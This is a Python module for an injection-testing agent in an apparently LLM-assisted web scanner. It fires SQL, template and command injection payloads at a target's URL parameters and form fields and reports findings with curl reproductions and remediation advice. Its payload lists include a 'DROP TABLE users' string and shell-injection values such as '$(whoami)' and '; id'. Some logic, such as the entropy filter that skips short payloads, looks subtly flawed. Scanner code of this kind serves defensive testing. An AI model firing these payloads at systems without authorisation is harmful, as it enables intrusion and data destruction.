"""
SPECTER Injection Agent
Tests for SQL injection, command injection, and template injection.
"""

import logging
from urllib.parse import urlparse, urlencode, parse_qs, urlunparse

from core.entropy import shannon_entropy, relative_entropy
from tools.http_client import HTTPClient
from core.session import SessionManager
from core.agent_base import BaseAgent
from core.agent_base import BaseAgent

logger = logging.getLogger("specter.injection")

# SQLi error signatures
SQLI_ERRORS = [
    "you have an error in your sql syntax",
    "warning: mysql",
    "unclosed quotation mark",
    "quoted string not properly terminated",
    "pg_query()",
    "sqlite_",
    "ora-01756",
    "microsoft ole db provider",
    "odbc driver",
    "syntax error in query expression",
    "mysql_fetch",
    "supplied argument is not a valid mysql",
    "division by zero",
    "invalid query",
]

SQLI_PAYLOADS = [
    "'",
    "''",
    "' OR '1'='1",
    "' OR 1=1--",
    "' OR 1=1#",
    '" OR "1"="1',
    "1' ORDER BY 1--",
    "1' ORDER BY 999--",
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "1 AND SLEEP(3)--",
    "1; DROP TABLE users--",
]

SSTI_PAYLOADS = [
    "{{7*7}}",
    "${7*7}",
    "<%= 7*7 %>",
    "{{config}}",
    "#{7*7}",
]

CMDI_PAYLOADS = [
    "; ls",
    "| ls",
    "`ls`",
    "; whoami",
    "| whoami",
    "$(whoami)",
    "; id",
    "& dir",
    "| dir",
]

CMDI_SIGNATURES = ["root:", "www-data", "uid=", "volume serial", "directory of"]


class InjectionAgent(BaseAgent):
    def __init__(self, router, target, config):
        super().__init__(router, target, config)
        self.name = "InjectionAgent"
        self.http = HTTPClient()
        # Initialize session manager for baseline functionality
        from core.session import SessionManager
        self.session_manager = SessionManager()

    def system_prompt(self):
        return (
            f"You are an injection vulnerability expert. Target: {self.target}\n"
            "Analyze test results for SQL injection, command injection, and template injection.\n"
            "Only confirm a vulnerability if there is clear evidence (error message, data leak, timing).\n"
            "Provide exact payloads and reproduction steps."
        )

    def _extract_params(self, url: str) -> list[str]:
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        return list(params.keys())

    def _inject_param(self, url: str, param: str, payload: str) -> str:
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        params[param] = [payload]
        new_query = urlencode(params, doseq=True)
        return urlunparse(parsed._replace(query=new_query))

    def _test_sqli(self, url: str, param: str) -> dict | None:
        """Test a single parameter for SQLi. Returns finding dict or None."""
        from core.entropy import relative_entropy
        from core.session import SessionManager
        from core.structural_entropy import StructuralAnalyzer

        baseline = self.http.get(url)
        baseline_len = len(baseline.text) if baseline else 0
        baseline_text = baseline.text if baseline else ""

        # Get baseline distribution for relative entropy calculation
        baseline_data = self.http.capture_baseline(url)

        # Save baseline to session if we have a session
        if hasattr(self, 'session') and self.session:
            self.session_manager.save_baseline(self.session, url, baseline_data)

        for payload in SQLI_PAYLOADS:
            # Compute entropy and skip low‑entropy payloads
            if shannon_entropy(payload) < self.config.get('entropy', {}).get('min_entropy', 3.0):
                continue
            test_url = self._inject_param(url, param, payload)
            resp = self.http.get(test_url)
            if not resp:
                continue
            body = resp.text.lower()

            # Error-based detection
            for sig in SQLI_ERRORS:
                if sig in body:
                    return {
                        "type":    "Error-Based SQLi",
                        "param":   param,
                        "payload": payload,
                        "url":     test_url,
                        "evidence": sig,
                    }

            # Length anomaly (possible blind SQLi)
            if abs(len(resp.text) - baseline_len) > 500:
                # Calculate relative entropy to check for "High Interest" payloads
                if baseline_text and resp.text:
                    rel_entropy = relative_entropy(baseline_text, resp.text)
                    # If relative entropy is high, flag as "High Interest"
                    if rel_entropy > self.config.get('entropy', {}).get('min_entropy', 3.0):
                        return {
                            "type":    "Possible Blind SQLi (length anomaly + high relative entropy)",
                            "param":   param,
                            "payload": payload,
                            "url":     test_url,
                            "evidence": f"Response length changed by {abs(len(resp.text) - baseline_len)} bytes",
                        }
                    else:
                        return {
                            "type":    "Possible Blind SQLi (length anomaly)",
                            "param":   param,
                            "payload": payload,
                            "url":     test_url,
                            "evidence": f"Response length changed by {abs(len(resp.text) - baseline_len)} bytes",
                        }
        return None
        return None

    def _test_ssti(self, url: str, param: str) -> dict | None:
        for payload in SSTI_PAYLOADS:
            test_url = self._inject_param(url, param, payload)
            resp = self.http.get(test_url)
            if not resp:
                continue
            if "49" in resp.text:  # 7*7 = 49
                return {
                    "type":    "Server-Side Template Injection",
                    "param":   param,
                    "payload": payload,
                    "url":     test_url,
                    "evidence": "Math expression was evaluated (7*7=49 found in response)",
                }
        return None

    def _test_cmdi_forms(self, url: str) -> list:
        """Test form fields for command injection."""
        results = []
        forms = self.http.get_forms(url)
        for form in forms:
            for inp in form["inputs"]:
                if not inp["name"]:
                    continue
                for payload in CMDI_PAYLOADS:
                    data = {i["name"]: i["value"] for i in form["inputs"]}
                    data[inp["name"]] = payload
                    if form["method"] == "POST":
                        resp = self.http.post(form["action"] or url, data=data)
                    else:
                        resp = self.http.get(form["action"] or url, params=data)
                    if not resp:
                        continue
                    body = resp.text.lower()
                    for sig in CMDI_SIGNATURES:
                        if sig in body:
                            results.append({
                                "type":    "Command Injection in Form",
                                "field":   inp["name"],
                                "payload": payload,
                                "url":     url,
                                "evidence": sig,
                            })
        return results

    def run(self) -> list:
        from rich.console import Console
        console = Console()
        console.print(f"\n[bold cyan][ InjectionAgent ][/bold cyan] Target: {self.target}")

        params = self._extract_params(self.target)
        console.print(f"  [→] URL parameters found: {params or 'none'}")

        # Test URL parameters
        for param in params:
            console.print(f"  [→] Testing '{param}' for SQLi...")
            result = self._test_sqli(self.target, param)
            if result:
                self.add_finding(
                    severity="CRITICAL",
                    title=f"SQL Injection: {result['type']} in '{param}'",
                    description=f"Parameter '{param}' is vulnerable.\nEvidence: {result['evidence']}",
                    poc=f"curl \"{result['url']}\"",
                    remediation="Use parameterized queries / prepared statements. Never concatenate user input into SQL.",
                    endpoint=self.target,
                )

            console.print(f"  [→] Testing '{param}' for SSTI...")
            result = self._test_ssti(self.target, param)
            if result:
                self.add_finding(
                    severity="CRITICAL",
                    title=f"Template Injection in '{param}'",
                    description=result["evidence"],
                    poc=f"curl \"{result['url']}\"",
                    remediation="Never pass user input directly to template engines. Sanitize all inputs.",
                    endpoint=self.target,
                )

        # Test forms
        console.print("  [→] Testing forms for command injection...")
        cmdi_results = self._test_cmdi_forms(self.target)
        for r in cmdi_results:
            self.add_finding(
                severity="CRITICAL",
                title=f"Command Injection in form field '{r['field']}'",
                description=f"Field '{r['field']}' executes OS commands. Evidence: '{r['evidence']}'",
                poc=f"Submit payload: {r['payload']} in field '{r['field']}'",
                remediation="Never pass user input to shell commands. Use safe APIs instead.",
                endpoint=r["url"],
            )

        # LLM deeper analysis if no params found
        if not params and not self.findings:
            console.print("  [→] No URL params — asking LLM for injection targets...")
            forms = self.http.get_forms(self.target)
            prompt = (
                f"Target {self.target} has no URL parameters.\n"
                f"Found forms: {forms}\n"
                "Suggest which form fields are likely injection points and what payloads to try."
            )
            advice = self.think(prompt)
            console.print(f"\n[dim]{advice[:500]}[/dim]\n")

        console.print(f"[green][ InjectionAgent ][/green] Complete — {len(self.findings)} finding(s)\n")
        return self.findings
